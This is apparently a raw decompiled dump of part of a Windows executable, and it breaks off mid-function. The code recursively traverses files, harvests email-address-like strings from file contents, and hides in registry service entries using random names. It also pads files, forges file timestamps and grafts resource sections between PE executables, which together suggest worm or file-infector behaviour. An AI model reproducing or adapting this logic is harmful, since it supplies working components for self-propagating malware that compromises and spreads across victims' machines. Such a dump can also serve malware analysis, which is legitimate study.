// 403D2A: conditional instruction was optimized away because eax.4 is in (4..C)

//----- (00403D4B) --------------------------------------------------------
int __cdecl sub_403D4B(char *FullPath)
{
  int v1; // edi
  int v2; // ebx
  char *v3; // eax
  char Ext[260]; // [esp+Ch] [ebp-104h] BYREF

  v1 = 0;
  _splitpath(FullPath, 0, 0, 0, Ext);
  v2 = sub_4034AE(&byte_4101FC, 0);
  if ( v2 <= 0 )
    return _strcmpi(Ext, &String2) != 0 ? -1 : -100;
  while ( 1 )
  {
    v3 = sub_40347E(&byte_4101FC, v1);
    if ( !_strcmpi(Ext, v3) )
      break;
    if ( ++v1 >= v2 )
      return _strcmpi(Ext, &String2) != 0 ? -1 : -100;
  }
  return v1;
}

//----- (00403DC6) --------------------------------------------------------
int __cdecl sub_403DC6(LPCSTR lpFileName, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
  HANDLE FileA; // edi

  FileA = CreateFileA(lpFileName, 0xC0000000, 3u, 0, 2u, 0x20u, 0);
  lpFileName = 0;
  if ( FileA == (HANDLE)-1 || !lpBuffer )
    return 0;
  WriteFile(FileA, lpBuffer, nNumberOfBytesToWrite, (LPDWORD)&lpFileName, 0);
  CloseHandle(FileA);
  return 1;
}

//----- (00403E16) --------------------------------------------------------
DWORD __cdecl sub_403E16(LPCSTR lpFileName)
{
  HANDLE FileA; // eax
  void *v2; // edi
  DWORD FileSize; // ebx

  FileA = CreateFileA(lpFileName, 0x80000000, 3u, 0, 3u, 0x27u, 0);
  lpFileName = 0;
  v2 = FileA;
  FileSize = -1;
  if ( FileA != (HANDLE)-1 )
  {
    FileSize = GetFileSize(FileA, (LPDWORD)&lpFileName);
    if ( lpFileName )
      FileSize = -1;
    CloseHandle(v2);
  }
  return FileSize;
}

//----- (00403E63) --------------------------------------------------------
int __cdecl sub_403E63(LPCSTR lpFileName)
{
  char v2[16]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h] BYREF

  sub_40174B(v2);
  if ( !sub_40174E((int)v2, lpFileName, (int)&v3, 1) )
    return 0;
  sub_401808((int)v2);
  return 1;
}

//----- (00403E97) --------------------------------------------------------
char *__cdecl sub_403E97(LPSTR lpTempFileName)
{
  signed int v1; // eax
  CHAR Buffer[260]; // [esp+4h] [ebp-118h] BYREF
  CHAR PrefixString[20]; // [esp+108h] [ebp-14h] BYREF

  sub_40372F(PrefixString, 2, 5, 4);
  GetTempPathA(0x104u, Buffer);
  GetTempFileNameA(Buffer, PrefixString, 0, lpTempFileName);
  sub_403F05(lpTempFileName);
  v1 = strlen(lpTempFileName);
  do
    --v1;
  while ( v1 >= 0 && lpTempFileName[v1] != 46 );
  return strcpy(&lpTempFileName[v1], &byte_4101DC);
}

//----- (00403F05) --------------------------------------------------------
BOOL __cdecl sub_403F05(LPCSTR lpFileName)
{
  SetFileAttributesA(lpFileName, 0x20u);
  return DeleteFileA(lpFileName);
}

//----- (00403F1C) --------------------------------------------------------
int __cdecl sub_403F1C(char *Source, int a2, int a3)
{
  int v3; // esi
  size_t v4; // eax
  bool v5; // zf
  CHAR *v6; // eax
  HANDLE FirstFileA; // edi
  struct _WIN32_FIND_DATAA FindFileData; // [esp+8h] [ebp-348h] BYREF
  CHAR FileName[260]; // [esp+148h] [ebp-208h] BYREF
  char Destination[260]; // [esp+24Ch] [ebp-104h] BYREF

  v3 = 0;
  strcpy(FileName, Source);
  v4 = strlen(FileName);
  if ( v4 )
  {
    v5 = FindFileData.cAlternateFileName[v4 + 15] == 92;
    v6 = &FindFileData.cAlternateFileName[v4 + 15];
    if ( v5 )
    {
      *v6 = 0;
      v3 = 1;
    }
  }
  strcat(FileName, asc_40F0B0);
  FirstFileA = FindFirstFileA(FileName, &FindFileData);
  if ( FirstFileA != (HANDLE)-1 )
  {
    do
    {
      strcpy(Destination, Source);
      if ( !v3 )
        strcat(Destination, asc_40F044);
      strcat(Destination, FindFileData.cFileName);
      if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
      {
        if ( strcmp(FindFileData.cFileName, asc_40F0AC)
          && strcmp(FindFileData.cFileName, asc_40F0A8)
          && ((int (__cdecl *)(char *, int, int))a2)(Destination, 1, a3) )
        {
          sub_403F1C(Destination, a2, a3);
        }
      }
      else if ( !((int (__cdecl *)(char *, _DWORD, int))a2)(Destination, 0, a3) )
      {
        break;
      }
    }
    while ( FindNextFileA(FirstFileA, &FindFileData) );
    FindClose(FirstFileA);
  }
  return 0;
}

//----- (0040406E) --------------------------------------------------------
int __cdecl sub_40406E(LPCSTR lpFileName, LONG lDistanceToMove)
{
  HANDLE FileA; // edi
  signed int FileSize; // esi
  DWORD FileSizeHigh; // [esp+Ch] [ebp-4h] BYREF
  int lpFileNamea; // [esp+18h] [ebp+8h]
  int lDistanceToMovea; // [esp+1Ch] [ebp+Ch]

  if ( lDistanceToMove < 86016 )
    return 0;
  SetFileAttributesA(lpFileName, 0x20u);
  FileA = CreateFileA(lpFileName, 0xC0000000, 3u, 0, 3u, 0x20u, 0);
  if ( FileA == (HANDLE)-1 )
    return 0;
  FileSize = GetFileSize(FileA, &FileSizeHigh);
  if ( FileSize <= lDistanceToMove )
  {
    SetFilePointer(FileA, 0, 0, 2u);
    lpFileNamea = lDistanceToMove - FileSize;
    if ( (lDistanceToMove - FileSize) / 0x80000 > 0 )
    {
      lDistanceToMovea = (lDistanceToMove - FileSize) / 0x80000;
      do
      {
        WriteFile(FileA, byte_4131D0, 0x80000u, &FileSizeHigh, 0);
        --lDistanceToMovea;
      }
      while ( lDistanceToMovea );
    }
    WriteFile(FileA, byte_4131D0, lpFileNamea % 0x80000, &FileSizeHigh, 0);
  }
  else
  {
    SetFilePointer(FileA, lDistanceToMove, 0, 0);
    SetEndOfFile(FileA);
  }
  CloseHandle(FileA);
  return 1;
}

//----- (00404138) --------------------------------------------------------
BOOL __cdecl sub_404138(LPCSTR lpFileName, LPFILETIME lpCreationTime)
{
  HANDLE FileA; // esi
  BOOL FileTime; // edi

  FileA = CreateFileA(lpFileName, 0x80000000, 3u, 0, 3u, 0x27u, 0);
  if ( FileA == (HANDLE)-1 )
    return 0;
  FileTime = GetFileTime(FileA, lpCreationTime, lpCreationTime + 1, lpCreationTime + 2);
  CloseHandle(FileA);
  return FileTime;
}

//----- (00404180) --------------------------------------------------------
BOOL __cdecl sub_404180(LPCSTR lpFileName, FILETIME *lpCreationTime)
{
  HANDLE FileA; // esi
  BOOL v4; // edi

  FileA = CreateFileA(lpFileName, 0xC0000000, 3u, 0, 3u, 0x27u, 0);
  if ( FileA == (HANDLE)-1 )
    return 0;
  v4 = SetFileTime(FileA, lpCreationTime, lpCreationTime + 1, lpCreationTime + 2);
  CloseHandle(FileA);
  return v4;
}

//----- (004041C8) --------------------------------------------------------
LPVOID __cdecl sub_4041C8(LPCSTR lpFileName, int a2, int a3)
{
  LPVOID result; // eax
  int v4; // ebx
  unsigned int v5; // edx
  void *v6; // esi
  int v7; // eax
  char v8[16]; // [esp+4h] [ebp-14h] BYREF
  int v9; // [esp+14h] [ebp-4h] BYREF

  sub_40174B(v8);
  result = sub_40174E((int)v8, lpFileName, (int)&v9, 1);
  v4 = (int)result;
  if ( result )
  {
    if ( a3 )
    {
      if ( (unsigned int)v9 > 0x19000 )
      {
        v5 = (sub_4047B6(0) % 0xAu + 84) << 10;
        if ( v5 < v9 )
          v9 = v5;
      }
    }
    v6 = operator new(2 * v9);
    if ( v6 )
    {
      memset(v6, 0, 2 * v9);
      v7 = sub_401000(v4, (int)v6, v9, 72);
      if ( a2 )
        *(_DWORD *)a2 = v7;
    }
    sub_401808((int)v8);
    return v6;
  }
  return result;
}

//----- (00404261) --------------------------------------------------------
char *__cdecl sub_404261(char *Destination, int a2, char *a3, int a4)
{
  char *result; // eax
  unsigned int v6; // eax
  unsigned int v7; // et2
  unsigned int v8; // eax
  unsigned int v9; // et2
  unsigned int v10; // eax
  char *v11; // eax
  unsigned int v12; // eax
  char *v13; // eax
  unsigned int v14; // eax
  char *v15; // eax
  char Source[260]; // [esp+Ch] [ebp-104h] BYREF
  unsigned int Destinationa; // [esp+118h] [ebp+8h]
  unsigned int Destinationb; // [esp+118h] [ebp+8h]
  unsigned int Destinationc; // [esp+118h] [ebp+8h]

  Source[0] = 0;
  result = (char *)memset(Destination, 0, 0x14u);
  if ( byte_4937EC[0] )
  {
    v6 = sub_4047B6(0);
    v7 = v6 % 3;
    result = (char *)(v6 / 3);
    if ( v7 )
    {
      result = (char *)sub_403A4F(byte_4937EC, Source, 3, 10, 1);
      if ( result )
        result = strcpy(Destination, Source);
    }
  }
  if ( !*Destination )
  {
    if ( FullPath )
    {
      v8 = sub_4047B6(0);
      v9 = v8 % 3;
      result = (char *)(v8 / 3);
      if ( v9 )
      {
        _splitpath(&FullPath, 0, 0, Source, 0);
        result = strcpy(Destination, Source);
      }
    }
    if ( !*Destination )
    {
      result = (char *)sub_4047B6(0);
      if ( ((unsigned __int8)result & 0xF) == 0 )
      {
        Destinationa = sub_4034AE(aU_1, 0);
        v10 = sub_4047B6(0);
        v11 = sub_40347E(aU_1, v10 % Destinationa);
        result = strcpy(Destination, v11);
      }
      if ( !*Destination )
        result = (char *)sub_40372F(Destination, 2, 6, 4);
    }
  }
  if ( a2 )
  {
    Destinationb = sub_4034AE(&byte_4101FC, 0);
    v12 = sub_4047B6(0);
    v13 = sub_40347E(&byte_4101FC, v12 % Destinationb);
    result = strcat(Destination, v13);
  }
  if ( a3 )
    return strcat(Destination, a3);
  if ( a4 )
  {
    Destinationc = sub_4034AE(&byte_4101DC, 0);
    v14 = sub_4047B6(0);
    v15 = sub_40347E(&byte_4101DC, v14 % Destinationc);
    return strcat(Destination, v15);
  }
  return result;
}

//----- (004043D4) --------------------------------------------------------
int __cdecl sub_4043D4(int a1, int a2, void *a3, size_t Size, int a5)
{
  int v5; // edi
  char *v7; // ebx
  char *i; // eax
  __int16 v9; // bx
  signed int v10; // edi
  int v11; // eax
  signed int v13; // [esp+10h] [ebp-10h]
  int v14; // [esp+10h] [ebp-10h]
  int v15; // [esp+14h] [ebp-Ch]
  int v16; // [esp+14h] [ebp-Ch]
  int v17; // [esp+18h] [ebp-8h]
  int v18; // [esp+18h] [ebp-8h]
  int v19; // [esp+1Ch] [ebp-4h]
  int v20; // [esp+28h] [ebp+8h]
  int v21; // [esp+2Ch] [ebp+Ch]

  v5 = -1;
  v19 = 0;
  v17 = -1;
  v13 = 0;
  v15 = 0;
  *(_DWORD *)a5 = 0;
  memset(a3, 0, Size);
  if ( sub_403C23(*(_BYTE *)a1) )
  {
    if ( sub_403C23(*(_BYTE *)a1) )
    {
      v7 = (char *)a1;
      for ( i = (char *)a3 - a1; ; i = (char *)a3 - a1 )
      {
        v7[(_DWORD)i] = *v7;
        if ( *v7 == 64 )
        {
          ++v15;
          v17 = v13;
        }
        if ( *v7 == 46 && v5 < 0 )
          v5 = v13;
        ++v19;
        ++v7;
        ++v13;
        if ( v19 >= a2 - 1 || v13 >= (int)(Size - 1) || !sub_403C23(*v7) )
          break;
      }
    }
    *((_BYTE *)a3 + v13) = 0;
    if ( v5 - v17 > 3 && v17 > 1 && v15 == 1 )
    {
LABEL_30:
      *(_DWORD *)a5 = 1;
      return a1 + v19;
    }
  }
  v18 = -1;
  v14 = -1;
  v19 = 0;
  v9 = *(_WORD *)a1;
  v10 = 0;
  v16 = 0;
  if ( sub_403C7D(*(_WORD *)a1) )
  {
    if ( sub_403C7D(v9) )
    {
      v11 = a2 - 1;
      v21 = 0;
      v20 = v11;
      do
      {
        *((_BYTE *)a3 + v10) = v9;
        if ( (_BYTE)v9 == 64 )
        {
          ++v16;
          v18 = v10;
        }
        if ( (_BYTE)v9 == 46 && v14 < 0 )
          v14 = v10;
        v21 += 4;
        v19 += 2;
        ++v10;
        if ( v21 >= v20 )
          break;
        if ( v10 >= (int)(Size - 1) )
          break;
        v9 = *(_WORD *)(v19 + a1);
      }
      while ( sub_403C7D(v9) );
    }
    *((_BYTE *)a3 + v10) = 0;
    if ( v14 - v18 <= 2 || v18 <= 1 || v16 != 1 )
      return a1 + v19;
    goto LABEL_30;
  }
  return a1 + 1;
}

//----- (00404555) --------------------------------------------------------
int __cdecl sub_404555(LPCSTR lpFileName, char *Destination, int a3, int a4)
{
  int v4; // ebx
  LPVOID v5; // eax
  LPVOID v6; // esi
  int v8; // edi
  char Source[1024]; // [esp+8h] [ebp-418h] BYREF
  char v10[16]; // [esp+408h] [ebp-18h] BYREF
  int v11; // [esp+418h] [ebp-8h] BYREF
  int v12; // [esp+41Ch] [ebp-4h] BYREF

  v4 = 0;
  v12 = 0;
  sub_40174B(v10);
  v5 = sub_40174E((int)v10, lpFileName, (int)&v11, 1);
  v6 = v5;
  if ( !v5 )
    return 0;
  v8 = (int)v5;
  while ( v8 - (int)v6 < v11 - 1 )
  {
    v8 = sub_4043D4(v8, (int)v6 + v11 - v8 - 1, Source, 0x400u, (int)&v12);
    if ( v12 )
    {
      if ( sub_4033F4(Destination, Source, a3, a4) > 0 )
        ++v4;
    }
  }
  sub_401808((int)v10);
  return v4;
}

//----- (004045EF) --------------------------------------------------------
int __cdecl sub_4045EF(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE lpData, HKEY phkResult)
{
  DWORD Type; // [esp+0h] [ebp-8h] BYREF
  DWORD cbData; // [esp+4h] [ebp-4h] BYREF

  Type = -1;
  cbData = (DWORD)phkResult;
  memset(lpData, 0, (size_t)phkResult);
  if ( RegOpenKeyA(hKey, lpSubKey, &phkResult) )
    return 1;
  RegQueryValueExA(phkResult, lpValueName, 0, &Type, lpData, &cbData);
  RegCloseKey(phkResult);
  return 0;
}

//----- (0040464B) --------------------------------------------------------
int __cdecl sub_40464B(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, BYTE *lpData)
{
  DWORD v5; // eax

  if ( RegCreateKeyA(hKey, lpSubKey, (PHKEY)&lpSubKey) )
    return 1;
  v5 = strlen((const char *)lpData);
  RegSetValueExA((HKEY)lpSubKey, lpValueName, 0, 1u, lpData, v5);
  RegCloseKey((HKEY)lpSubKey);
  return 0;
}

//----- (00404691) --------------------------------------------------------
int __cdecl sub_404691(HKEY hKey, LPCSTR lpSubKey, int a3, int a4)
{
  DWORD v4; // esi
  int v6; // eax
  int v7; // esi
  CHAR Name[260]; // [esp+4h] [ebp-10Ch] BYREF
  int v9; // [esp+108h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+10Ch] [ebp-4h] BYREF

  v4 = 0;
  if ( RegOpenKeyA(hKey, lpSubKey, &phkResult) )
    return 0;
  while ( !RegEnumKeyA(phkResult, v4, Name, 0x104u) )
  {
    if ( a3 )
    {
      v9 = 0;
      v6 = ((int (__cdecl *)(HKEY, LPCSTR, CHAR *, int *, int))a3)(hKey, lpSubKey, Name, &v9, a4);
      if ( v9 )
      {
        v7 = v6;
        goto LABEL_9;
      }
    }
    ++v4;
  }
  v7 = 1;
LABEL_9:
  RegCloseKey(phkResult);
  return v7;
}

//----- (0040470F) --------------------------------------------------------
int __cdecl sub_40470F(HKEY hKey, LPCSTR lpSubKey, int a3, int a4)
{
  DWORD v4; // ebx
  int v6; // eax
  int v7; // esi
  char Data[1024]; // [esp+8h] [ebp-814h] BYREF
  CHAR ValueName[1024]; // [esp+408h] [ebp-414h] BYREF
  DWORD Type; // [esp+808h] [ebp-14h] BYREF
  DWORD cchValueName; // [esp+80Ch] [ebp-10h] BYREF
  int v12; // [esp+810h] [ebp-Ch] BYREF
  DWORD cbData; // [esp+814h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+818h] [ebp-4h] BYREF

  v4 = 0;
  cchValueName = 1024;
  cbData = 1024;
  if ( RegOpenKeyA(hKey, lpSubKey, &phkResult) )
    return 0;
  while ( 1 )
  {
    cchValueName = 1024;
    cbData = 1024;
    if ( RegEnumValueA(phkResult, v4, ValueName, &cchValueName, 0, &Type, (LPBYTE)Data, &cbData) )
      break;
    if ( Type == 1 )
    {
      if ( a3 )
      {
        v12 = 0;
        v6 = ((int (__cdecl *)(HKEY, LPCSTR, CHAR *, int *, int))a3)(hKey, lpSubKey, ValueName, &v12, a4);
        if ( v12 )
        {
          v7 = v6;
          goto LABEL_10;
        }
      }
    }
    ++v4;
  }
  v7 = 1;
LABEL_10:
  RegCloseKey(phkResult);
  return v7;
}
// 40470F: using guessed type BYTE Data[1024];

//----- (004047B6) --------------------------------------------------------
int __cdecl sub_4047B6(int a1)
{
  int TickCount; // eax

  if ( a1 || !dword_4131CC )
  {
    TickCount = GetTickCount();
    sub_407F35(TickCount);
    dword_4131CC = rand();
  }
  return rand();
}
// 4131CC: using guessed type int dword_4131CC;

//----- (004047E2) --------------------------------------------------------
HANDLE __cdecl sub_4047E2(LPCSTR lpApplicationName, LPSTR lpCommandLine)
{
  BOOL v2; // eax
  struct _STARTUPINFOA StartupInfo; // [esp+4h] [ebp-54h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+48h] [ebp-10h] BYREF

  memset(&StartupInfo, 0, sizeof(StartupInfo));
  StartupInfo.cb = 68;
  v2 = CreateProcessA(lpApplicationName, lpCommandLine, 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation);
  return v2 ? ProcessInformation.hProcess : 0;
}

//----- (00404825) --------------------------------------------------------
const char *__cdecl sub_404825(LPCSTR lpFileName)
{
  const char *result; // eax
  const char *v2; // ebx
  int v3; // edi
  char v4[16]; // [esp+8h] [ebp-1Ch] BYREF
  size_t MaxCount; // [esp+18h] [ebp-Ch]
  int v6; // [esp+1Ch] [ebp-8h]
  int v7; // [esp+20h] [ebp-4h] BYREF

  sub_40174B(v4);
  v6 = 0;
  MaxCount = strlen(&String1);
  result = (const char *)sub_40174E((int)v4, lpFileName, (int)&v7, 1);
  v2 = result;
  if ( result )
  {
    if ( (unsigned int)v7 >= 0xA000 )
    {
      v3 = 4096;
      if ( (unsigned int)(v7 - 1000) > 0x1000 )
      {
        while ( strncmp(&String1, &v2[v3], MaxCount) )
        {
          if ( ++v3 >= (unsigned int)(v7 - 1000) )
            goto LABEL_8;
        }
        v6 = 1;
      }
    }
LABEL_8:
    sub_401808((int)v4);
    return (const char *)v6;
  }
  return result;
}

//----- (004048B6) --------------------------------------------------------
int __cdecl sub_4048B6(HKEY hKey, char *Source, LPCSTR lpValueName, int a4, int a5)
{
  BYTE Data[1024]; // [esp+0h] [ebp-400h] BYREF

  if ( !sub_403C88((char *)lpValueName, aO) )
    return 1;
  Data[0] = 0;
  sub_4045EF(hKey, Source, lpValueName, Data, (HKEY)0x400);
  if ( !sub_404825((LPCSTR)Data) )
    return 1;
  *(_DWORD *)a5 = 1;
  *(_DWORD *)a4 = 1;
  strcpy(Destination, Source);
  strcpy((char *)&ApplicationName, (const char *)Data);
  strcpy(ServiceName, lpValueName);
  return 0;
}

//----- (0040494A) --------------------------------------------------------
int __cdecl sub_40494A(HKEY hKey, char *Source, char *a3, int a4, int a5)
{
  BYTE Data[1024]; // [esp+0h] [ebp-800h] BYREF
  char Destination[1024]; // [esp+400h] [ebp-400h] BYREF

  strcpy(Destination, Source);
  strcat(Destination, asc_40F044);
  strcat(Destination, a3);
  if ( !sub_403C88(Destination, aO) )
    return 1;
  Data[0] = 0;
  sub_4045EF(hKey, Destination, ValueName, Data, (HKEY)0x400);
  if ( !sub_404825((LPCSTR)Data) )
    return 1;
  *(_DWORD *)a5 = 1;
  *(_DWORD *)a4 = 1;
  strcpy(::Destination, Source);
  strcpy((char *)&ApplicationName, (const char *)Data);
  strcpy(ServiceName, a3);
  return 0;
}

//----- (00404A18) --------------------------------------------------------
int sub_404A18()
{
  char *v0; // eax
  int i; // esi
  size_t v2; // eax
  CHAR Buffer[260]; // [esp+0h] [ebp-51Ch] BYREF
  char Source[1024]; // [esp+104h] [ebp-418h] BYREF
  char Destination[20]; // [esp+504h] [ebp-18h] BYREF
  int v7; // [esp+518h] [ebp-4h] BYREF

  v7 = 0;
  if ( dword_4938F0 )
  {
    sub_403CE3(Source, 2);
    strcpy(::Destination, Source);
    sub_40470F(HKEY_LOCAL_MACHINE, Source, (int)sub_4048B6, (int)&v7);
  }
  else
  {
    v0 = sub_40347E(SubKey, 4);
    sub_404691(HKEY_LOCAL_MACHINE, v0, (int)sub_40494A, (int)&v7);
  }
  dword_4938F4 = v7;
  if ( !v7 )
  {
    GetSystemDirectoryA(Buffer, 0x104u);
    for ( i = 0; i < 10; ++i )
    {
      strcpy(Destination, aO);
      v2 = strlen(Destination);
      sub_40372F(&Destination[v2], 2, 4, 4);
      _strlwr(&Destination[1]);
      strcpy(Source, Buffer);
      strcat(Source, asc_40F044);
      strcat(Source, Destination);
      strcat(Source, &byte_4101DC);
      if ( !sub_403E63(Source) )
        break;
    }
    strcat(ServiceName, Destination);
    strcpy((char *)&ApplicationName, Source);
  }
  return 1;
}
// 4938F0: using guessed type int dword_4938F0;
// 4938F4: using guessed type int dword_4938F4;

//----- (00404B75) --------------------------------------------------------
__int16 *__cdecl sub_404B75(__int16 *a1, __int16 a2)
{
  __int16 *result; // eax
  __int16 v3; // cx
  __int16 v4; // cx

  result = a1;
  a1[1] += a2;
  v3 = a1[1];
  while ( v3 < 1 )
  {
    a1[1] += 30;
    v3 = a1[1];
    --*a1;
  }
  if ( a1[1] > 31 )
  {
    do
    {
      a1[1] -= 30;
      v4 = a1[1];
      ++*a1;
    }
    while ( v4 > 31 );
  }
  if ( *a1 < 1 )
    *a1 += 12;
  if ( *a1 > 12 )
    *a1 -= 12;
  return result;
}

//----- (00404BD2) --------------------------------------------------------
int __cdecl sub_404BD2(int a1, char *Destination, char *a3)
{
  char *v3; // eax
  char v4; // cl
  int i; // edx
  const char *v6; // edx

  *Destination = 0;
  *a3 = 0;
  if ( *(_BYTE *)a1 != 92 || *(_BYTE *)(a1 + 1) != 92 )
    return 1;
  strcpy(Destination, asc_40F0B8);
  v3 = (char *)(a1 + 2);
  v4 = *(_BYTE *)(a1 + 2);
  for ( i = 2; v4 != 92; v4 = *++v3 )
  {
    if ( !v4 )
      break;
    ++i;
    Destination[(_DWORD)v3 - a1] = *v3;
  }
  Destination[i] = 0;
  v6 = (const char *)(a1 + i);
  if ( *v6 )
  {
    strcpy(a3, v6);
    return 0;
  }
  return 2;
}

//----- (00404C49) --------------------------------------------------------
BOOL sub_404C49()
{
  char Dir[260]; // [esp+4h] [ebp-410h] BYREF
  char Destination[260]; // [esp+108h] [ebp-30Ch] BYREF
  char String2[260]; // [esp+20Ch] [ebp-208h] BYREF
  CHAR Filename[260]; // [esp+310h] [ebp-104h] BYREF

  strcpy(Destination, (const char *)&ApplicationName);
  GetModuleFileNameA(0, Filename, 0x104u);
  _splitpath(Destination, 0, Dir, 0, 0);
  _splitpath(Filename, 0, String2, 0, 0);
  return _strcmpi(Dir, String2) == 0;
}

//----- (00404CC5) --------------------------------------------------------
unsigned int __cdecl sub_404CC5(int a1, unsigned int a2)
{
  unsigned int v2; // edx

  if ( a2 >= 0x44
    && *(_BYTE *)a1 == 77
    && *(_BYTE *)(a1 + 1) == 90
    && (v2 = *(unsigned __int16 *)(a1 + 60), v2 <= a2 - 4) )
  {
    return *(_DWORD *)(a1 + *(unsigned __int16 *)(a1 + 60)) == 17744 ? v2 : 0;
  }
  else
  {
    return 0;
  }
}

//----- (00404D04) --------------------------------------------------------
_DWORD *__cdecl sub_404D04(int a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // eax
  unsigned int v4; // ecx
  unsigned int v5; // edx
  int v6; // eax
  unsigned int v7; // ecx
  unsigned int v8; // esi
  unsigned int v9; // edi
  _DWORD *result; // eax
  unsigned int v11; // edx

  v3 = sub_404CC5(a1, a3);
  if ( v3 )
  {
    v4 = v3 + a1;
    v5 = *(_DWORD *)(v3 + a1 + 116);
    v6 = v3 + a1 + 116;
    if ( v5 >= a2 )
    {
      v7 = *(unsigned __int16 *)(v4 + 6);
      v8 = *(_DWORD *)(v6 + 8 * a2 - 4);
      v9 = 0;
      result = (_DWORD *)(v6 + 4 + 8 * v5 + 8);
      if ( v7 )
      {
        while ( (unsigned int)result - a1 < a3 - 4 )
        {
          v11 = result[1];
          if ( v11 + *result <= v8 || v11 > v8 )
          {
            result += 10;
            if ( ++v9 < v7 )
              continue;
          }
          if ( v9 < v7 )
            return result;
          return 0;
        }
      }
    }
  }
  return 0;
}

//----- (00404D74) --------------------------------------------------------
int __cdecl sub_404D74(int a1, int a2, int a3, unsigned int a4, unsigned int a5)
{
  int v7; // eax
  unsigned int *v8; // eax
  unsigned int v9; // eax
  int v11; // [esp+14h] [ebp+8h]
  int v12; // [esp+18h] [ebp+Ch]

  v12 = a2 + 16;
  if ( a2 - a1 + 16 > a5 )
    return 0;
  v11 = 0;
  if ( *(unsigned __int16 *)(a2 + 12) + *(unsigned __int16 *)(a2 + 14) > 0 )
  {
    while ( v12 - a1 + 8 <= a5 )
    {
      v7 = *(_DWORD *)(v12 + 4);
      if ( v7 >= 0 )
      {
        v8 = (unsigned int *)(a1 + v7);
        *v8 += a4 - a3;
        v9 = *v8;
        if ( v9 < a4 || v9 >= a4 + a5 )
          return 0;
      }
      else if ( !sub_404D74(a1, a1 + (v7 & 0x7FFFFFFF), a3, a4, a5) )
      {
        return 0;
      }
      v12 += 8;
      if ( ++v11 >= *(unsigned __int16 *)(a2 + 12) + *(unsigned __int16 *)(a2 + 14) )
        return 1;
    }
  }
  return 1;
}

//----- (00404E1A) --------------------------------------------------------
int __cdecl sub_404E1A(LPCSTR a1, LPCSTR lpFileName, int a3)
{
  char *v4; // eax
  int v5; // ebx
  _DWORD *v6; // edi
  _DWORD *v7; // esi
  unsigned int v8; // eax
  unsigned int v9; // ebx
  int v10; // ecx
  size_t v11; // eax
  const CHAR *v12; // esi
  char *v13; // edi
  int v14; // eax
  int v15; // ecx
  unsigned int v16; // eax
  LONG v17; // eax
  char v18[16]; // [esp+4h] [ebp-3Ch] BYREF
  char v19[16]; // [esp+14h] [ebp-2Ch] BYREF
  int v20; // [esp+24h] [ebp-1Ch]
  unsigned int v21; // [esp+28h] [ebp-18h]
  char *v22; // [esp+2Ch] [ebp-14h]
  LONG lDistanceToMove; // [esp+30h] [ebp-10h]
  int v24; // [esp+34h] [ebp-Ch]
  int v25; // [esp+38h] [ebp-8h] BYREF
  int v26; // [esp+3Ch] [ebp-4h] BYREF
  LPCSTR lpFileNamea; // [esp+4Ch] [ebp+Ch]
  int v28; // [esp+50h] [ebp+10h]
  int v29; // [esp+50h] [ebp+10h]

  sub_40174B(v19);
  sub_40174B(v18);
  v25 = 0;
  v26 = 0;
  v24 = 0;
  lDistanceToMove = 0;
  lpFileNamea = (LPCSTR)sub_40174E((int)v18, lpFileName, (int)&v26, 1);
  if ( !lpFileNamea )
    return 0;
  sub_40406E(a1, v26 + a3 + 4096);
  v4 = (char *)sub_40174E((int)v19, a1, (int)&v25, 0);
  v5 = (int)v4;
  v22 = v4;
  if ( v4 )
  {
    v6 = sub_404D04((int)v4, 3u, v25);
    if ( v6 )
    {
      v7 = sub_404D04((int)lpFileNamea, 3u, v26);
      if ( v7 )
      {
        v28 = sub_404CC5((int)lpFileNamea, v26);
        v8 = sub_404CC5(v5, v25);
        if ( *(_WORD *)&lpFileNamea[v28 + 92] == 2 )
        {
          v9 = v8 + v5;
          v29 = *(_DWORD *)&lpFileNamea[v28 + 140];
          *(_DWORD *)(v9 + 140) = v29;
          v10 = v6[3];
          v6[2] = v7[2];
          *v6 = *v7;
          lDistanceToMove = v10 + v6[2];
          v20 = v7[1];
          v21 = v6[1];
          v11 = v7[2];
          v12 = &lpFileNamea[v7[3]];
          v13 = &v22[v10];
          if ( (unsigned int)&v12[v11 - (_DWORD)lpFileNamea] <= v26 )
          {
            memcpy(v13, v12, v11);
            v14 = sub_404D74((int)v13, (int)v13, v20, v21, v29);
            v15 = *(unsigned __int16 *)(v9 + 20);
            v24 = v14;
            v16 = *(_DWORD *)(v15 + v9 + 40 * *(unsigned __int16 *)(v9 + 6) - 8)
                + *(_DWORD *)(v15 + v9 + 40 * *(unsigned __int16 *)(v9 + 6) - 4);
            if ( (v16 & 0xFFF) != 0 )
              v16 = ((v16 >> 12) + 1) << 12;
            *(_DWORD *)(v9 + 80) = v16;
          }
        }
      }
    }
    sub_401808((int)v19);
  }
  sub_401808((int)v18);
  if ( v24 )
  {
    v17 = lDistanceToMove;
    if ( lDistanceToMove < (unsigned int)v26 )
      v17 = v26;
    sub_40406E(a1, v17);
    sub_405108(a1);
  }
  return v24;
}

//----- (00404FC5) --------------------------------------------------------
int __cdecl sub_404FC5(LPCSTR lpFileName, int a2)
{
  int v2; // esi
  LPVOID v3; // eax
  int v4; // ebx
  unsigned int v6; // edi
  _DWORD *v7; // eax
  _DWORD *v8; // esi
  unsigned int v9; // ecx
  unsigned int v10; // ecx
  unsigned int v11; // edi
  int v12; // eax
  char v13[16]; // [esp+8h] [ebp-14h] BYREF
  int v14; // [esp+18h] [ebp-4h] BYREF

  sub_40174B(v13);
  v2 = 0;
  v3 = sub_40174E((int)v13, lpFileName, (int)&v14, 0);
  v4 = (int)v3;
  if ( !v3 )
    return 0;
  v6 = sub_404CC5((int)v3, v14);
  if ( v6 && (v7 = sub_404D04(v4, 3u, v14)) != 0 )
  {
    v8 = (_DWORD *)(v6 + v4);
    *(_DWORD *)(v6 + v4 + 140) = 16;
    v9 = v7[1] + 16;
    *v7 = 16;
    v7[2] = 16;
    if ( (v9 & 0xFFF) != 0 )
      v9 = ((v9 >> 12) + 1) << 12;
    v8[20] = v9;
    v10 = v7[3];
    v11 = v10 + v7[2];
    if ( v11 < a2 )
      v11 = a2;
    if ( (v11 & 0xFFF) != 0 )
